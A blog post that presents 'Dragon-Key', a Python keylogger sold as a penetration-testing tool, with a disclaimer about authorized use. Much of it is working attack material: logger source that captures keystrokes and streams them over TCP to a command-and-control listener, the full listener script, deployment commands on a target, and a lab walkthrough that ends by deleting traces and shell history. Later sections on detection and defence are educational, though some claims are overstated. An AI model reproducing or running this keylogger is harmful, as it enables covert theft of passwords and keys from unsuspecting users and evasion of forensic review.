---
title: Dragon-Key - Real-Time Keystroke Logger for Penetration Testing
tags: [Penetration Testing, Red Team, Keylogger, Security Tools]
description: Deep dive into Dragon-Key, a lightweight TCP-based keylogger for authorized security auditing and vulnerability assessment
date: 2025-03-12
---

**Repository Link:** https://github.com/drackyjr/dragon-key



---

## The Gateway to Understanding Input Capture Attacks

In the world of penetration testing, understanding **how attackers exfiltrate sensitive data** is just as important as understanding **how to defend against them**. Enter **Dragon-Key**—a lightweight, real-time keystroke logger that demonstrates one of the most insidious attack vectors: capturing what users type.

But before you get excited (or worried), let's be crystal clear: **This tool is strictly for authorized penetration testing in controlled environments.** Unauthorized use is illegal and unethical. Full stop.



---

## What Exactly is Dragon-Key?

Dragon-Key is a **specialized keystroke capture tool** designed specifically for security professionals. Unlike the malicious keyloggers used by threat actors, Dragon-Key is:

- **Transparent** - Built explicitly for authorized testing
- **Educational** - Shows you *how* keystroke capture actually works
- **Real-time** - Captures and transmits keystrokes with minimal latency
- **Remote-capable** - Sends data over TCP to a command & control server
- **Lightweight** - Minimal system resource footprint

Think of it as a scalpel in the hands of a surgeon, not a knife in the hands of a criminal.

### The Core Architecture

Dragon-Key operates on a **client-server model**:

```
┌─────────────────────────────┐
│   Target System (Client)    │
│  ┌───────────────────────┐  │
│  │   Dragon-Key Logger   │  │
│  │  - Captures keystrokes│  │
│  │  - Buffers data       │  │
│  │  - Sends over TCP     │  │
│  └──────────┬────────────┘  │
└─────────────│────────────────┘
              │ TCP Connection
              │ (Port 4444)
              ▼
┌─────────────────────────────┐
│   C2 Server (Listener)      │
│  ┌───────────────────────┐  │
│  │   Receives & Logs     │  │
│  │   Keystroke Data      │  │
│  │   For Analysis        │  │
│  └───────────────────────┘  │
└─────────────────────────────┘
```

The beauty (and danger) of this approach is its simplicity. A single TCP connection can exfiltrate *everything* the user types—passwords, API keys, source code, confidential emails—you name it.

---

## Why This Matters for Penetration Testers

You might ask: "Why would I ever need to log keystrokes?" Here are the real-world scenarios:

### Scenario 1: Detecting Credential Theft Vulnerabilities

Imagine you're auditing a bank's internal systems. If a user can be tricked into downloading malware, can that malware capture their login credentials? Dragon-Key helps you answer this question safely in a lab.

### Scenario 2: Red Team Exercise

Your organization runs a red team exercise. Part of the assessment involves demonstrating how easily credentials can be harvested from a compromised workstation. This is where Dragon-Key shines—it shows, doesn't just tell.

### Scenario 3: System Hardening Validation

You've implemented new security controls. Now you need to verify that even if an attacker gains execution, they *can't* harvest keystrokes. Dragon-Key becomes your testing weapon.

### Scenario 4: Training & Awareness

What's scarier than reading about keyloggers? *Seeing* one in action (in a safe lab). Security awareness training using real demonstrations is infinitely more effective than slides.

---

## Installation & Setup

### Prerequisites

Before we begin, make sure you have:

- **Written Authorization** ✅ (Non-negotiable!)
- **Isolated Lab Network** - Never test on production
- **Python 3.6+** - Dragon-Key is Python-based
- **Root/Admin Privileges** - Required for keystroke capture
- **Linux or Windows Target** - Depending on your setup

### Step 1: Clone the Repository

```bash
# Navigate to your projects directory
cd ~/projects/

# Clone Dragon-Key
git clone https://github.com/drackyjr/dragon-key.git
cd dragon-key

# List the contents
ls -la
```

Expected output:
```
-rw-r--r-- dragon_key.py
-rw-r--r-- c2_listener.py
-rw-r--r-- README.md
-rw-r--r-- requirements.txt
```

### Step 2: Install Dependencies

```bash
# Install required Python packages
pip install -r requirements.txt

# Or manually (if no requirements file)
pip install pynput
```

The `pynput` library is crucial—it provides cross-platform keyboard monitoring.

### Step 3: Review the Code

This is **critical**. Never run security tools blindly.

```bash
# Open the main logger
cat dragon_key.py
```

You'll see something like:

```python
from pynput import keyboard
import socket
import time

class DragonKeyLogger:
    def __init__(self, c2_ip, c2_port):
        self.c2_ip = c2_ip
        self.c2_port = c2_port
        self.connection = None
        self.buffer = ""
    
    def on_press(self, key):
        """Callback when a key is pressed"""
        try:
            self.buffer += key.char
        except AttributeError:
            # Handle special keys (Enter, Shift, etc)
            self.buffer += f"[{key.name}]"
    
    def send_to_c2(self):
        """Send buffered keystrokes to C2 server"""
        if not self.buffer:
            return
        
        self.connection.send(self.buffer.encode())
        self.buffer = ""
    
    def start(self):
        """Start keystroke capture"""
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.c2_ip, self.c2_port))
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
```

See how it works? It's elegant. It's also *terrifying* in the wrong hands.

---

## Setting Up the C2 Server

Before deploying the logger, you need something to receive the data.

### Create the Listener

```bash
# Create a simple listener script (c2_listener.py)
cat > c2_listener.py << 'EOF'
import socket
import sys

def start_listener(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    
    print(f"[*] Listening on {host}:{port}")
    print("[*] Waiting for incoming connections...")
    
    while True:
        try:
            client, addr = server.accept()
            print(f"\n[+] Connection received from {addr}")
            
            while True:
                data = client.recv(1024)
                if not data:
                    break
                print(f"[KEY] {data.decode()}", end='', flush=True)
            
            client.close()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            break

if __name__ == "__main__":
    start_listener()
EOF
```

### Start the Listener

```bash
# Open a terminal window for the C2 server
python3 c2_listener.py

# Output:
# [*] Listening on 0.0.0.0:4444
# [*] Waiting for incoming connections...
```

Leave this running. This is your command post where all the captured keystrokes will arrive.

---

## Deploying Dragon-Key

### On the Target System

```bash
# Navigate to the Dragon-Key directory on the target
cd /tmp/dragon-key

# Run with your C2 server IP and port
python3 dragon_key.py --ip <YOUR_C2_IP> --port 4444
```

Replace `<YOUR_C2_IP>` with the actual IP of your C2 listener.

### What Happens Next?

The moment you press any key on the target system, watch your C2 listener:

```
[*] Listening on 0.0.0.0:4444
[*] Waiting for incoming connections...

[+] Connection received from 192.168.1.50:54321
[KEY] h[KEY] e[KEY] l[KEY] l[KEY] o[KEY] [SPACE][KEY] w[KEY] o[KEY] r[KEY] l[KEY] d[ENTER]
[KEY] m[KEY] y[KEY] p[KEY] a[KEY] s[KEY] s[KEY] w[KEY] o[KEY] r[KEY] d[KEY] 1[KEY] 2[KEY] 3[ENTER]
```

There it is. *Every keystroke.* Including passwords, search queries, emails—everything.

This is why keyloggers are so dangerous.

---

## Real-World Implications

Let's think about what an attacker could see:

```
# Banking Login
[KEY] u[KEY] s[KEY] e[KEY] r[KEY] n[KEY] a[KEY] m[KEY] e[SPACE][KEY] m[KEY] a[KEY] r[KEY] k[ENTER]
[KEY] p[KEY] a[KEY] s[KEY] s[KEY] w[KEY] o[KEY] r[KEY] d[ENTER]

# API Key Paste
[KEY] A[KEY] P[KEY] I[KEY] _[KEY] K[KEY] E[KEY] Y[KEY] =[KEY] s[KEY] k[KEY] _[KEY] l[KEY] i[KEY] v[KEY] e[KEY] ...[ENTER]

# Confidential Search
[KEY] s[KEY] e[KEY] a[KEY] r[KEY] c[KEY] h[SPACE][KEY] d[KEY] a[KEY] t[KEY] a[SPACE][KEY] b[KEY] r[KEY] e[KEY] a[KEY] c[KEY] h[ENTER]
```

**In seconds, the attacker has:**
- Banking credentials
- API keys
- Evidence of a data breach
- Potentially more

This is why understanding keyloggers is critical for **every** cybersecurity professional.

---

## Detection: How to Spot Dragon-Key

### Method 1: Process Monitoring

```bash
# Check running Python processes
ps aux | grep python

# Suspicious output would show:
# root      1234  0.5  0.1  12345  6789 ?  S  14:32  0:00  python3 dragon_key.py
```

Red flags:
- Python process with unusual arguments
- Processes running from /tmp or suspicious locations
- Network connections from Python processes

### Method 2: Network Monitoring

```bash
# Check active network connections
netstat -an | grep ESTABLISHED

# Look for suspicious outbound connections:
# tcp  0  0  192.168.1.50:54321  192.168.1.100:4444  ESTABLISHED
```

### Method 3: File Integrity Monitoring

```bash
# Check for recently modified Python files
find / -name "*.py" -mmin -60 2>/dev/null

# Look for suspicious library imports
grep -r "pynput\|keyboard" /tmp/ 2>/dev/null
```

### Method 4: EDR/XDR Solutions

Modern Endpoint Detection and Response tools can detect:
- Unusual keyboard driver interactions
- Suspicious process creation patterns
- Unexpected network communications
- Behavioral anomalies

---

## Defense: Protecting Against Keyloggers

### Technical Defenses

#### 1. Keep Systems Updated
```bash
# On Linux
sudo apt update && sudo apt upgrade -y

# On Windows
# Run Windows Update regularly
```

#### 2. Implement Privilege Escalation Prevention
- Run users with **least privilege**
- Use UAC (User Account Control) on Windows
- Enforce SELinux on Linux

#### 3. Deploy EDR Solutions
Tools like:
- Microsoft Defender for Endpoint
- CrowdStrike Falcon
- SentinelOne
- Carbon Black

#### 4. Network Segmentation
- Isolate sensitive systems on VLANs
- Monitor inter-network traffic
- Implement zero-trust architecture

### Behavioral Defenses

#### 1. Multi-Factor Authentication (MFA)
Even if a keylogger captures your password, the attacker needs the second factor:
```
Login attempts:
- Password: ✓ (captured by logger)
- TOTP Code: ✗ (attacker doesn't have it)
```

#### 2. Password Managers
Don't type passwords manually. Let a password manager handle it:
```bash
# Using KeePass or 1Password
# Password never appears on screen
# Attacker sees: [CTRL][SHIFT][C] [CTRL][V]
# But has no idea what was pasted
```

#### 3. Hardware Security Keys
```bash
# YubiKey, Titan, etc.
# Physical key required for authentication
# Keyloggers are powerless against them
```

#### 4. Virtual Keyboards
For highly sensitive systems, use on-screen keyboards:
```
[Click: U] [Click: s] [Click: e] [Click: r]
# Keylogger sees nothing
```

---



## The Bigger Picture: Why This Matters

Understanding Dragon-Key isn't just about learning a tool. It's about understanding:

1. **Attack Surface** - Where can keyloggers hide in your infrastructure?
2. **Threat Modeling** - How would an attacker use this against you?
3. **Defense Strategies** - What layers of protection do you need?
4. **Risk Assessment** - What's your organization's actual exposure?

This knowledge makes you a **better defender**, not a better attacker.

---

## Comparison: Dragon-Key vs Other Tools

| Tool | Purpose | Complexity | Legal Status |
|------|---------|-----------|--------------|
| **Dragon-Key** | Real-time keystroke logging | Low | Educational only |
| **Metasploit** | Full exploitation framework | High | Penetration testing |
| **Empire** | Post-exploitation framework | High | Red teaming |
| **Burp Suite** | Web application testing | Medium | Security assessment |
| **Wireshark** | Network traffic analysis | Medium | Defensive/forensic |

Dragon-Key is the *simplest* example of keystroke capture. Real-world malware uses far more sophisticated techniques.

---

## Practical Lab Exercise

Ready to try this yourself? Here's a complete lab setup:

### Lab Setup (Estimated Time: 30 minutes)

#### Prerequisites
- VirtualBox or Hyper-V
- 2 Virtual Machines (attacker + victim)
- Both should be on the same virtual network
- Snapshot both VMs before starting

#### Steps

**1. Get Attacker VM ready**
```bash
cd ~/projects/
git clone https://github.com/drackyjr/dragon-key.git
cd dragon-key
pip install -r requirements.txt
python3 c2_listener.py
```

**2. Victim VM Setup**
```bash
# Create a test user
sudo useradd -m -s /bin/bash testuser
sudo passwd testuser

# Log in as testuser
su testuser

# Copy dragon-key from attacker VM
scp attacker@192.168.1.100:/home/attacker/projects/dragon-key /tmp/
cd /tmp/dragon-key

# Get attacker VM IP
# Then run the logger
python3 dragon_key.py --ip 192.168.1.100 --port 4444
```

**3. Generate Keystrokes**
```bash
# Type some text
echo "My Password is SuperSecret123"
curl https://api.example.com -H "Authorization: Bearer sk_live_123456789"
```

**4. Observe on Attacker VM**
```
[+] Connection received from 192.168.1.50:54321
[KEY] M[KEY] y[SPACE][KEY] P[KEY] a[KEY] s[KEY] s[KEY] w[KEY] o[KEY] r[KEY] d...
```

**5. Clean Up**
```bash
# On Victim VM - kill the logger
pkill -f dragon_key.py

# On Attacker VM - stop the listener
CTRL+C

# Delete all traces
rm -rf /tmp/dragon-key
rm -f ~/.bash_history
```

---

## Key Takeaways

1. **Keyloggers are real and dangerous** - They capture everything
2. **Understanding them makes you a better defender** - You can't defend against what you don't understand
3. **Authorization is non-negotiable** - Always get written permission
4. **Multiple defenses are essential** - No single solution stops all attacks
5. **Education is your best weapon** - Knowledge prevents mistakes

---



*Repository: https://github.com/drackyjr/dragon-key*